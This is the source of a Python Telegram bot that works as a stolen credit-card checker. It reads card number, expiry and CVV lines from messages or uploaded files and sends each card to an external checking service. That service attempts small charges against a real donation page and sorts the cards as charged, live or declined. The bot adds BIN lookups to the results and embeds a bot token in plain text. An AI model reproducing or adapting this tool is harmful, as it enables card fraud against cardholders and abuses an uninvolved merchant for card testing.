import os
import re
import requests
import time
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = '8610138136:AAHHtP1A21F3NdW6hcQHocpgkcd-GF2EE_U'
API_URL = "http://gatescheck.duckdns.org:7000/check"

stop_users = {}

# ------------------- BIN Lookup -------------------
def get_bin_info(bin_number):
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10)
        data = r.json()
        brand = data.get("scheme", "N/A")
        card_type = data.get("type", "N/A")
        bank = data.get("bank", {}).get("name", "N/A")
        country = data.get("country", {}).get("name", "N/A")
        info = f"{brand} - {card_type}"
        return info, bank, country
    except:
        return "N/A", "N/A", "N/A"

# ------------------- Check API -------------------
def check_card_api(card_full):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": card_full,
        "amount": 0.50
    }
    try:
        response = requests.get(API_URL, params=params, timeout=15)
        result_raw = response.json().get('result', '')
        result = result_raw.lower()

        if "charge" in result or "success" in result:
            return "approved", "Charge"
        elif "insufficient" in result:
            return "live", "Insufficient Funds"
        else:
            return "declined", result_raw
    except:
        return "declined", "Error"

# ------------------- Format Response -------------------
def format_response(card_full, status, response, taken):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = get_bin_info(bin_number)

    title = "#Charge ✅" if status == "approved" else "#Live 🟢"

    return f"""{title}

💳 Card: {card_full}
📨 Response: {response}

🏦 Info: {info}
🏛 Bank: {bank}
🌍 Country: {country}

⏱ Time: {taken}s
"""

# ------------------- /pp -------------------
async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_full = " ".join(context.args)
    if not card_full:
        await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
        return

    start_time = time.time()
    status, response = check_card_api(card_full)
    taken = round(time.time() - start_time, 2)

    if status in ["approved", "live"]:
        text = format_response(card_full, status, response, taken)
        await update.message.reply_text(text)
    else:
        await update.message.reply_text("Declined ❌")

# ------------------- /stop -------------------
async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text("Stopped ⛔")

# ------------------- File Handler -------------------
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = False

    if not os.path.exists('downloads'):
        os.makedirs('downloads')

    file = await update.message.document.get_file()
    file_path = f"downloads/{file.file_id}.txt"
    await file.download_to_drive(file_path)

    approved = 0
    live = 0
    declined = 0

    last_card = "None"
    last_response = "None"
    last_status = "None"
    last_panel = ""

    panel_msg = await update.message.reply_text("Start Checking... 🔍")

    with open(file_path, 'r', encoding='utf-8') as f:
        for line in f:
            if stop_users.get(user_id):
                await update.message.reply_text("Stopped ⛔")
                return

            line = line.strip()
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match:
                continue

            card_full = match[0]

            try:
                start_time = time.time()
                status, response = check_card_api(card_full)
                taken = round(time.time() - start_time, 2)
            except:
                status = "declined"
                response = "Error"
                taken = 0

            # تحديث آخر نتيجة
            last_card = card_full
            last_response = response

            if status == "approved":
                approved += 1
                last_status = "Charge ✅"
            elif status == "live":
                live += 1
                last_status = "Live 🟢"
            else:
                declined += 1
                last_status = "Declined ❌"

            # إرسال فقط Live و Charge
            if status in ["approved", "live"]:
                text = format_response(card_full, status, response, taken)
                await update.message.reply_text(text)

            panel = f"""📊 Status

✅ Charge: {approved}
🟢 Live: {live}
❌ Declined: {declined}
📂 Total: {approved + live + declined}

━━━━━━━━━━━━━━━
💳 Last Card: {last_card}
📨 Response: {last_response}
📌 Status: {last_status}
━━━━━━━━━━━━━━━

⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
"""

            if panel != last_panel:
                try:
                    await panel_msg.edit_text(panel)
                    last_panel = panel
                except:
                    pass

            await asyncio.sleep(1)

    await update.message.reply_text("Done ✅")

# ------------------- Start -------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Bot Ready ✅")

# ------------------- Run -------------------
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    app.run_polling()

if __name__ == "__main__":
    main()
